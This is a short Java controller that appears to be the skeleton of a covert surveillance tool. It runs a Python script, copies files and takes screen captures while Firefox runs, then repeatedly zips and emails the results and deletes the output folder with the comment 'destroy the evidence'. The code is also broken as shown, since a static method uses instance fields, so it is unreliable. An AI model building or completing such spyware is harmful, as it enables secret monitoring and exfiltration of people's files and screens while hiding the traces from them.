import java.io.IOException;



public class Controller {
	private String SOURCE_FOLDER = "..\\..\\..\\..\\TestDataIn";
	private String OUTPUT_FOLDER = "..\\..\\..\\..\\TestDataOut";
	private String PROCESS = "Firefox.exe";
	
	public static void main(String args[]) throws IOException{
		Runtime rt = Runtime.getRuntime();
		rt.exec("cmd /c c:\\path\\to\\python python\\test.py");
		
	//start the thread to copy files as tHe agent runs. 
			Thread f = new Thread(new CopyFiles(SOURCE_FOLDER, OUTPUT_FOLDER));
			System.out.println("running copier");
			f.start();
			
	//start the thread to take screencaps
			Thread c = new Thread(new Check(OUTPUT_FOLDER, PROCESS));
			System.out.println("running screecapper");
			c.start();
	
	 		
	while(true){
		try {
			Thread.sleep(100000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	///mail me the result
		System.out.println("trying to mail");
			Mail2 m = new Mail2(OUTPUT_FOLDER);
			m.zipandmail();
			System.out.println("mailem");
	//Delete the Directory
			DeleteDirectory d = new DeleteDirectory(OUTPUT_FOLDER);
			d.Delete();
			
			
			System.out.println("destroy the evidence");
	//wait  ten minutes
	try {
		Thread.sleep(100000);
	} catch (InterruptedException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	}
	}
}
